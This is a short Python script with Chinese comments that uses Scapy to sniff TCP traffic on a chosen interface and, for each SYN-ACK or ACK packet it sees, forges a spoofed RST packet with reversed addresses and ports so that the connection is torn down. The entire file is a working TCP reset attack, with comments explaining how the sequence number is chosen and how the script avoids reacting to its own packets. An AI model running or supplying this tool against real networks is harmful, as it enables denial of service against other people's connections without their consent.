from scapy.all import *

# 定义一个回调函数，用于处理嗅探到的TCP包
def rst_attack(pkt):
    # 如果包是TCP包，并且是SYN-ACK或ACK包，说明是TCP连接建立过程中的包
    # 这里很重要，为了过滤掉自己发的RST包，不然程序会将自己发送的RST包当做正常包来处理，导致无限循环
    if pkt.haslayer(TCP) and (pkt[TCP].flags == "SA" or pkt[TCP].flags == "A"):
        # 获取包的源IP、目的IP、源端口、目的端口和序列号
        src_ip = pkt[IP].src
        dst_ip = pkt[IP].dst
        src_port = pkt[TCP].sport
        dst_port = pkt[TCP].dport
        seq = pkt[TCP].ack
        # 构造一个RST包，将源IP、目的IP、源端口、目的端口和序列号设置为与原包相反的值，且seq值为上一个包的ack值，这样就不用根据上一个seq和数据偏移量来计算下一个正确的seq值了
        ip = IP(src=dst_ip, dst=src_ip)
        tcp = TCP(sport=dst_port, dport=src_port, flags="R", seq=seq)
        rst = ip/tcp
        # 发送伪造的RST包
        send(rst, verbose=0)
        print("sniffpkt: seq{} ack{} \nRST packet sent from {}:{} to {}:{} seq{}".format(pkt[TCP].seq, seq,dst_ip, dst_port, src_ip, src_port,  seq))
        
striface=input("br...(iface):")
# 使用sniff函数嗅探网络上的TCP包，指定iface参数为网卡接口，指定prn参数为回调函数
sniff(filter="tcp", iface=striface, prn=rst_attack)

